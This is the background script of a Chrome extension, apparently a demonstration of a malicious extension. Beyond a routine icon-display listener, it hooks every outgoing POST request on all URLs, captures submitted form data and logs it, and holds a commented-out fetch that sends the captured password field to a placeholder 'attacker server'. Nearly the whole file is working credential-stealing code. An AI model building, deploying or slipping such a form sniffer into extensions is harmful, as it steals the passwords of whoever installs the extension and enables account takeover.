//to show extension icon on toolbar
chrome.runtime.onMessage.addListener(function(request,sender,sendResponse){
    if(request.todo == "showPageAction"){
        chrome.tabs.query({active:true, currentWindow: true}, function(tabs){
            chrome.pageAction.show(tabs[0].id);
        });
    }
});

//sniff form data
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if(details.method == "POST") {
        chrome.tabs.query({active:true, currentWindow: true}, function(tabs){
          console.log(tabs[0].url);
        });
        var pass = JSON.stringify(details.requestBody.formData);
        console.log(pass);
        /*change url below to any attacker server URL
        fetch('<URL of attacker server>', {
          method: 'post',
          body: details.requestBody.formData['password'][0],
        })
        .then(response => response.json())
        .then(data => console.log(data));*/
      }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);
